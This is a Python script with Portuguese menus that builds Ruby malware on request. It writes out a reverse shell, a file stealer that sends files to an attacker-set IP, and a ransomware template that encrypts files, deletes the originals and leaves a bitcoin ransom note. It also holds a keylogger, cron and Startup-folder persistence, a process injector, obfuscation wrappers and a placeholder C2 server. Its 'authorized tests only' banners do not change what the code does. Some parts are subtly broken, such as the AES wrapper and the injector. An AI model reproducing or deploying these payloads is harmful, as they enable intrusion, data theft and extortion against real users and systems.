#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
from typing import Dict, List, Optional

# Criptografia
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from cryptography.fernet import Fernet

# Interface colorida
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax

# Realce de c√≥digo
import pygments
from pygments.lexers import RubyLexer
from pygments.formatters import TerminalFormatter

console = Console()

class GeradorPayloadsRuby:
    def __init__(self):
        self.payloads = {
            'reverse_shell': {
                'function': self.gerar_reverse_shell,
                'category': 'Redes',
                'danger_level': 'high',
                'description': 'Reverse Shell TCP'
            },
            'file_stealer': {
                'function': self.gerar_file_stealer,
                'category': 'Exfiltra√ß√£o',
                'danger_level': 'high',
                'description': 'Roubador de arquivos'
            },
            'process_injector': {
                'function': self.gerar_process_injector,
                'category': 'Inje√ß√£o',
                'danger_level': 'critical',
                'description': 'Injetor de c√≥digo em processos'
            },
            'persistence': {
                'function': self.gerar_persistence,
                'category': 'Persistence',
                'danger_level': 'medium',
                'description': 'Mecanismo de persist√™ncia'
            },
            'keylogger': {
                'function': self.gerar_keylogger,
                'category': 'Keyloggers',
                'danger_level': 'high',
                'description': 'Keylogger para Linux/Windows'
            },
            'memory_scanner': {
                'function': self.gerar_memory_scanner,
                'category': 'Mem√≥ria',
                'danger_level': 'medium',
                'description': 'Scanner de mem√≥ria por padr√µes'
            },
            'ransomware': {
                'function': self.gerar_ransomware,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Ransomware b√°sico em Ruby'
            },
            'web_scraper': {
                'function': self.gerar_web_scraper,
                'category': 'Web',
                'danger_level': 'low',
                'description': 'Coletor de dados web'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'base64': 'Codifica√ß√£o Base64',
            'xor': 'Cifra XOR',
            'aes': 'Criptografia AES',
            'metaprogramming': 'Metaprograma√ß√£o',
            'packing': 'Empacotamento'
        }
        
        self.banners = [
            self._gerar_banner_ruby(),
            self._gerar_banner_hacker(),
            self._gerar_banner_metasploit()
        ]
        
        self.c2_server = "http://your-c2-server.com/data"
        
        self._verificar_dependencias()
    
    def _gerar_banner_ruby(self) -> str:
        return """
[bold red]
  _____       _           _____           _       _ 
 |  __ \     | |         |  __ \         | |     | |
 | |__) |   _| |__   ___ | |__) |__  _ __| | ___ | |
 |  _  / | | | '_ \ / _ \|  ___/ _ \| '__| |/ _ \| |
 | | \ \ |_| | |_) | (_) | |  | (_) | |  | | (_) | |
 |_|  \_\__,_|_.__/ \___/|_|   \___/|_|  |_|\___/|_|
[/bold red]
[bold white on red]       GERADOR DE PAYLOADS RUBY - v2.3.1[/bold white on red]
"""
    
    def _gerar_banner_hacker(self) -> str:
        return """
[bold green]
 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïù    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
‚ñà‚ñà‚ïë‚ñÑ‚ñÑ ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó  ‚ïö‚ñà‚ñà‚ïî‚ïù      ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù   ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
 ‚ïö‚ïê‚ïê‚ñÄ‚ñÄ‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù    ‚ïö‚ïê‚ïù       ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù
[/bold green]
[bold black on green]       RUBY HACKING TOOLKIT - EDITION 2023[/bold black on green]
"""
    
    def _gerar_banner_metasploit(self) -> str:
        return """
[bold magenta]
                      ____________
 [Metasploit]        \     _____/
                     /    /  [Ruby]
       \     ___     /    /       __
        \    \  \   /    /      /  \ 
         \    \  \ /    /      /    \ 
          \    \  /    /      /      \ 
           \    \/    /      /        \ 
            \         \     /          \ 
             \         \   /            \ 
              \         \ /              \ 
               \                        _\ 
                \                      / \ 
                 \                    / \ 
                  \                  / \ 
                   \                / \ 
                    \              / \ 
                     \            / \ 
                      \          / \ 
                       \        / \ 
                        \      / \ 
                         \    / \ 
                          \  / \ 
                           \/ \ 
                            \ \ 
                             \ \ 
                              \ \ 
                               \ \ 
                                \ \ 
                                 \ \ 
                                  \ \ 
                                   \ \ 
                                    \ \ 
                                     \ \ 
                                      \ \ 
                                       \ \ 
                                        \ \ 
                                         \ \ 
                                          \ \ 
                                           \ \ 
                                            \ \ 
                                             \ \ 
                                              \ \ 
                                               \ \ 
[/bold magenta]
[bold white on magenta]       METASPLOIT RUBY PAYLOAD GENERATOR[/bold white on magenta]
"""
    
    def _verificar_dependencias(self):
        required = {
            'cryptography': 'cryptography',
            'pycryptodome': 'pycryptodomex',
            'rich': 'rich',
            'pygments': 'pygments'
        }
        
        missing = []
        for pkg, install_name in required.items():
            try:
                __import__(pkg)
            except ImportError:
                missing.append(install_name)
        
        if missing:
            console.print(Panel.fit(
                f"[red]‚úó Depend√™ncias faltando: {', '.join(missing)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            if Confirm.ask("Deseja instalar automaticamente?"):
                with Progress() as progress:
                    task = progress.add_task("[red]Instalando...[/red]", total=len(missing))
                    for pkg in missing:
                        os.system(f"pip install {pkg} --quiet")
                        progress.update(task, advance=1)
                console.print("[green]‚úì Depend√™ncias instaladas![/green]")
                time.sleep(1)
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è USE APENAS PARA TESTES AUTORIZADOS! ‚ö†Ô∏è[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def limpar_tela(self):
        console.print("\n" * 3)
        console.print(Panel.fit(
            "[yellow]Pressione Enter para continuar...[/yellow]",
            border_style="yellow"
        ))
        input()
        console.clear()
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]üîß MENU PRINCIPAL[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Op√ß√£o", style="cyan", width=10)
            tabela.add_column("Categoria", style="green")
            tabela.add_column("Perigo", style="red")
            
            categorias = {
                'Redes': "Shells e Conex√µes",
                'Exfiltra√ß√£o': "Roubo de Dados",
                'Inje√ß√£o': "Inje√ß√£o de C√≥digo",
                'Persistence': "Mecanismos de Persist√™ncia",
                'Keyloggers': "Keyloggers",
                'Mem√≥ria': "Manipula√ß√£o de Mem√≥ria",
                'Destrutivos': "Payloads Destrutivos",
                'Web': "Web Hacking"
            }
            
            for i, (cod, nome) in enumerate(categorias.items(), 1):
                perigo = "‚ò†Ô∏è CR√çTICO" if cod == 'Destrutivos' else "‚ö†Ô∏è ALTO" if cod in ['Inje√ß√£o', 'Keyloggers', 'Exfiltra√ß√£o'] else "‚óé M√âDIO" if cod == 'Redes' else "‚ö™ BAIXO"
                tabela.add_row(str(i), nome, perigo)
            
            tabela.add_row("0", "Configura√ß√µes", "‚öôÔ∏è")
            tabela.add_row("9", "Sair", "üö™")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]‚û§[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, 10)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_submenu('Redes')
            elif escolha == "2":
                self._mostrar_submenu('Exfiltra√ß√£o')
            elif escolha == "3":
                self._mostrar_submenu('Inje√ß√£o')
            elif escolha == "4":
                self._mostrar_submenu('Persistence')
            elif escolha == "5":
                self._mostrar_submenu('Keyloggers')
            elif escolha == "6":
                self._mostrar_submenu('Mem√≥ria')
            elif escolha == "7":
                self._mostrar_submenu('Destrutivos')
            elif escolha == "8":
                self._mostrar_submenu('Web')
            elif escolha == "0":
                self._mostrar_menu_configuracao()
            elif escolha == "9":
                self._sair()
            self.limpar_tela()
    
    def _mostrar_submenu(self, categoria: str):
        payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
        
        while True:
            console.clear()
            titulo = f"[bold]{categoria.upper()}[/bold] - Selecione"
            
            if categoria == 'Destrutivos':
                titulo = f"[blink bold red]‚ò†Ô∏è {categoria.upper()} ‚ò†Ô∏è[/blink bold red]"
            
            tabela = Table(
                title=titulo,
                show_header=True,
                header_style="bold blue"
            )
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Nome", style="green")
            tabela.add_column("Descri√ß√£o")
            tabela.add_column("Perigo", style="red")
            
            for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                icone_perigo = {
                    'low': '‚ö™',
                    'medium': '‚ö†Ô∏è',
                    'high': 'üî•',
                    'critical': 'üíÄ'
                }.get(dados['danger_level'], '')
                tabela.add_row(
                    str(i),
                    nome,
                    dados['description'],
                    f"{icone_perigo} {dados['danger_level'].upper()}"
                )
            
            tabela.add_row("0", "Voltar", "Retornar", "‚Ü©Ô∏è")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]‚û§[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, len(payloads_categoria)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
            self._processar_payload(nome_payload)
            self.limpar_tela()
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]‚ö†Ô∏è PERIGO ELEVADO ‚ö†Ô∏è[/blink bold red]\n"
                "Este payload pode causar danos permanentes\n"
                "Use apenas em ambientes controlados!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar cria√ß√£o?", default=False):
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        ofuscar = Confirm.ask("Aplicar t√©cnicas de ofusca√ß√£o?")
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=30)
            
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_ruby(payload, tecnica)
                    progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload)
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload in ['reverse_shell', 'file_stealer']:
            console.print(Panel.fit(
                "[bold]Configura√ß√£o[/bold]",
                border_style="blue"
            ))
            config['ip'] = Prompt.ask("[yellow]?[/yellow] IP", default="192.168.1.100")
            config['porta'] = IntPrompt.ask("[yellow]?[/yellow] Porta", default=4444)
        
        elif nome_payload == 'ransomware':
            console.print(Panel.fit(
                "[bold red]Configura√ß√£o[/bold red]",
                border_style="red"
            ))
            config['extensoes'] = Prompt.ask(
                "[yellow]?[/yellow] Extens√µes (separadas por v√≠rgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt"
            ).split(',')
            config['resgate'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem de resgate",
                default="Seus arquivos foram criptografados!"
            )
        
        elif nome_payload in ['web_scraper']:
            config['url'] = Prompt.ask(
                "[yellow]?[/yellow] URL alvo",
                default="https://exemplo.com"
            )
        
        console.print("\n[bold]Resumo:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar?"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        console.print("\n[bold]T√©cnicas:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("T√©cnica", style="green")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione (separadas por v√≠rgula)",
            default="1,3"
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str):
        console.print(Panel.fit(
            "[bold]PR√â-VISUALIZA√á√ÉO[/bold]",
            border_style="yellow"
        ))
        
        lexer = RubyLexer()
        formatter = TerminalFormatter()
        
        lines = payload.split('\n')[:30]
        code = '\n'.join(lines)
        
        highlighted = pygments.highlight(code, lexer, formatter)
        console.print(highlighted)
        
        if len(payload.split('\n')) > 30:
            console.print("[yellow]... (truncado)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo",
            default=f"payload_{nome_payload}.rb"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]‚úì Salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]‚úó Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
    
    def _mostrar_menu_configuracao(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]‚öôÔ∏è CONFIGURA√á√ïES[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=False)
            tabela.add_row("1", "Alterar servidor C2")
            tabela.add_row("2", "Testar ofusca√ß√£o")
            tabela.add_row("0", "Voltar")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]‚û§[/blink yellow] Selecione",
                choices=["0", "1", "2"],
                show_choices=False
            )
            
            if escolha == "1":
                self.c2_server = Prompt.ask(
                    "[yellow]?[/yellow] Novo servidor C2",
                    default=self.c2_server
                )
            elif escolha == "2":
                self._testar_ofuscacao()
            elif escolha == "0":
                return
            self.limpar_tela()
    
    def _testar_ofuscacao(self):
        console.clear()
        codigo_teste = "puts 'Hello World'"
        
        console.print(Panel.fit(
            "[bold]TESTE DE OFUSCA√á√ÉO[/bold]",
            border_style="yellow"
        ))
        
        tabela = Table(title="T√©cnicas", show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("T√©cnica")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[yellow]?[/yellow] Selecione",
            choices=[str(i) for i in range(1, len(self.tecnicas_ofuscacao)+1)],
            show_choices=False
        )
        
        tecnica = list(self.tecnicas_ofuscacao.keys())[int(escolha)-1]
        codigo_ofuscado = self._ofuscar_ruby(codigo_teste, tecnica)
        
        console.print("\nResultado:")
        console.print(Syntax(codigo_ofuscado, "ruby"))
    
    def _ofuscar_ruby(self, payload: str, tecnica: str) -> str:
        if tecnica == 'base64':
            return self._ofuscar_base64(payload)
        elif tecnica == 'xor':
            return self._ofuscar_xor(payload)
        elif tecnica == 'aes':
            return self._ofuscar_aes(payload)
        elif tecnica == 'metaprogramming':
            return self._ofuscar_metaprogramming(payload)
        elif tecnica == 'packing':
            return self._ofuscar_packing(payload)
        return payload
    
    def _ofuscar_base64(self, payload: str) -> str:
        encoded = base64.b64encode(payload.encode()).decode()
        return f"eval(Base64.decode64('{encoded}'))"
    
    def _ofuscar_xor(self, payload: str) -> str:
        key = random.randint(1, 255)
        xor_str = ','.join([str(ord(c) ^ key) for c in payload])
        return f"""
key = {key}
payload = [{xor_str}].pack('C*').bytes.map {{|b| b ^ key }}.pack('C*')
eval(payload)
"""
    
    def _ofuscar_aes(self, payload: str) -> str:
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted = cipher.encrypt(payload.encode())
        
        return f"""
require 'openssl'
require 'base64'

key = "{key.decode()}"
encrypted = "{encrypted.decode()}"

cipher = OpenSSL::Cipher.new('aes-256-cbc')
cipher.decrypt
cipher.key = Base64.decode64(key)
decrypted = cipher.update(Base64.decode64(encrypted)) + cipher.final

eval(decrypted)
"""
    
    def _ofuscar_metaprogramming(self, payload: str) -> str:
        methods = [f"def _{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}; end" 
                  for _ in range(5)]
        random.shuffle(methods)
        
        return "\n".join(methods) + "\n\n" + payload
    
    def _ofuscar_packing(self, payload: str) -> str:
        compressed = zlib.compress(payload.encode())
        encoded = base64.b64encode(compressed).decode()
        
        return f"""
require 'zlib'
require 'base64'

compressed = Base64.decode64('{encoded}')
eval(Zlib::Inflate.inflate(compressed))
"""

    # Implementa√ß√µes dos payloads em Ruby
    def gerar_reverse_shell(self, ip: str, porta: int, **kwargs) -> str:
        return f"""require 'socket'

begin
  sock = TCPSocket.new("{ip}", {porta})
  sock.puts("[+] Conectado!")
  
  loop do
    sock.print("$ ")
    cmd = sock.gets.chomp
    next if cmd.empty?
    
    begin
      output = `#{cmd} 2>&1`
      sock.puts(output)
    rescue => e
      sock.puts("Erro: #{e}")
    end
  end
rescue => e
  # Silencia erros
end
"""
    
    def gerar_file_stealer(self, ip: str, porta: int, **kwargs) -> str:
        return f"""require 'socket'
require 'find'

def send_file(socket, path)
  File.open(path, 'rb') do |file|
    socket.write([File.basename(path)].pack('A256'))
    socket.write([file.size].pack('L'))
    socket.write(file.read)
  end
end

begin
  socket = TCPSocket.new("{ip}", {porta})
  
  # Envia arquivos do diret√≥rio atual
  Find.find('.') do |path|
    if File.file?(path)
      begin
        send_file(socket, path)
      rescue
        next
      end
    end
  end
  
  socket.close
rescue
  # Silencia erros
end
"""
    
    def gerar_process_injector(self, **kwargs) -> str:
        return """# Injeta c√≥digo Ruby em outro processo
require 'fiddle'

def inject(pid, code)
  begin
    # Obt√©m handle do processo
    handle = Fiddle::Handle::new(pid.to_s)
    
    # Aloca mem√≥ria no processo
    mem = Fiddle::Pointer.malloc(code.bytesize)
    mem[0, code.bytesize] = code
    
    # Cria thread remota para executar o c√≥digo
    thread = handle['CreateRemoteThread'].call(0, 0, 0, mem, 0, 0)
    
    thread != 0
  rescue
    false
  end
end

# Exemplo: injeta em processo com PID 1234
# inject(1234, "File.write('hacked.txt', 'Voc√™ foi hackeado!')")
"""
    
    def gerar_persistence(self, **kwargs) -> str:
        return """# Mecanismo de persist√™ncia
if RUBY_PLATFORM =~ /win32|mingw/
  # Windows
  startup = File.join(Dir.home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
  File.write(File.join(startup, 'persistence.rb'), File.read(__FILE__))
else
  # Linux/Unix
  crontab = '0 * * * * ruby ' + File.expand_path(__FILE__)
  system("(crontab -l 2>/dev/null; echo '#{crontab}') | crontab -")
end
"""
    
    def gerar_keylogger(self, **kwargs) -> str:
        return """# Keylogger b√°sico para Linux
require 'io/console'

def log_key
  log_file = File.expand_path('~/.keylog.txt')
  
  loop do
    char = STDIN.getch
    File.open(log_file, 'a') { |f| f.write(char) }
    
    # Envia a cada 100 caracteres (opcional)
    if File.size(log_file) > 100
      # Implementar envio para C2 aqui
      File.truncate(log_file, 0)
    end
  end
end

# Inicia em thread separada
Thread.new { log_key }
"""
    
    def gerar_memory_scanner(self, **kwargs) -> str:
        return """# Scanner de mem√≥ria por padr√µes
require 'fiddle'

def scan_memory(pattern)
  pid = Process.pid
  mem_regions = `cat /proc/#{pid}/maps`.split("\n")
  
  mem_regions.each do |region|
    next unless region.include?('rw')
    
    range = region.split[0].split('-')
    start_addr = range[0].to_i(16)
    end_addr = range[1].to_i(16)
    
    # L√™ a regi√£o de mem√≥ria
    memory = Fiddle::Pointer.new(start_addr, end_addr - start_addr)
    
    # Procura pelo padr√£o
    if memory.to_s.include?(pattern)
      puts "Padr√£o encontrado em: 0x#{start_addr.to_s(16)}"
    end
  end
end

# Exemplo: scan_memory("senha")
"""
    
    def gerar_ransomware(self, extensoes: List[str], resgate: str, **kwargs) -> str:
        ext_str = ', '.join(f'"{ext}"' for ext in extensoes)
        return f"""# Ransomware b√°sico em Ruby
require 'openssl'

KEY = OpenSSL::Random.random_bytes(32)
IV = OpenSSL::Random.random_bytes(16)

def encrypt_file(path)
  cipher = OpenSSL::Cipher.new('AES-256-CBC')
  cipher.encrypt
  cipher.key = KEY
  cipher.iv = IV

  data = File.read(path, mode: 'rb')
  encrypted = cipher.update(data) + cipher.final

  File.write(path + '.encrypted', encrypted)
  File.delete(path)
rescue
  nil
end

# Criptografa arquivos com extens√µes alvo
Dir.glob('**/*').each do |file|
  next unless File.file?(file)
  
  if [{ext_str}].any? {{ |ext| file.end_with?(ext) }}
    encrypt_file(file)
  end
end

# Cria nota de resgate
File.write('LEIA-ME.txt', '''{resgate}

Para recuperar seus arquivos, envie 0.5 BTC para...
''')
"""
    
    def gerar_web_scraper(self, url: str, **kwargs) -> str:
        return f"""# Web Scraper avan√ßado
require 'net/http'
require 'nokogiri'

def scrape(url)
  uri = URI(url)
  response = Net::HTTP.get_response(uri)
  
  if response.is_a?(Net::HTTPSuccess)
    doc = Nokogiri::HTML(response.body)
    
    # Extrai todos os links
    links = doc.css('a').map {{ |a| a['href'] }}.compact
    
    # Extrai dados de formul√°rios
    forms = doc.css('form').map do |form|
      {{
        action: form['action'],
        method: form['method'],
        inputs: form.css('input').map {{ |i| i['name'] }}.compact
      }}
    end
    
    # Envia dados para C2 (implementar)
    # send_to_c2(links: links, forms: forms)
  end
end

scrape("{url}")
"""

    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è ATEN√á√ÉO: USO ILEGAL √â CRIME! ‚ö†Ô∏è[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        gerador = GeradorPayloadsRuby()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]‚úó Cancelado[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]‚úó Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
